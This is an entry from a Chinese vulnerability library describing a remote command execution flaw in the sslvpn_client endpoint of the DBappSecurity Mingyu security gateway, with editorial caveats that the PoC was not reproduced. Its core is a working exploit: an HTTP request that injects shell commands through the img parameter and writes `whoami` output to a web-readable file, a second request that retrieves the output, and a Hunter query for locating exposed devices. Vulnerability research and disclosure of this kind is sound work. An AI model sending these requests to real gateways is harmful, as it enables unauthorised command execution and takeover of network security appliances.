---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "安恒明御安全网关sslvpn_client存在远程命令执行漏洞"
product: "安恒明御安全网关"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "与迈普/鑫塔/博达完全相同sslvpn_client请求需核OEM与各产品证据，不能据相同请求确认全部受影响；无版本修复/回显，写ceshi.txt需清理"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3sslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
hunter: "app.name=\"安恒明御安全网关\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dg8qpqumcbgb7vgs"
id: "vw-1dc9233a55c578d83290c3c8"
entity_id: "ve-1dc9233a55c578d83290c3c8"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 安恒明御安全网关sslvpn_client存在远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：安恒明御安全网关
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：与迈普/鑫塔/博达完全相同sslvpn_client请求需核OEM与各产品证据，不能据相同请求确认全部受影响；无版本修复/回显，写ceshi.txt需清理
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. Hunter被错填FOFA app.name=
2. 与迈普/鑫塔/博达完全相同sslvpn_client请求需核OEM与各产品证据，不能据相同请求确认全部受影响
3. 无版本修复/回显，写ceshi.txt需清理
4. 去大段宣传

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/dg8qpqumcbgb7vgs>

### 归档技术正文

# 一、漏洞简介
安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关sslvpn_client存在远程命令执行漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 安恒明御安全网关

# 三、资产测绘
+ hunter`app.name="安恒明御安全网关"`
+ 特征


# 四、漏洞复现
```plain
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


获取命令执行结果

```plain
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dg8qpqumcbgb7vgs>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
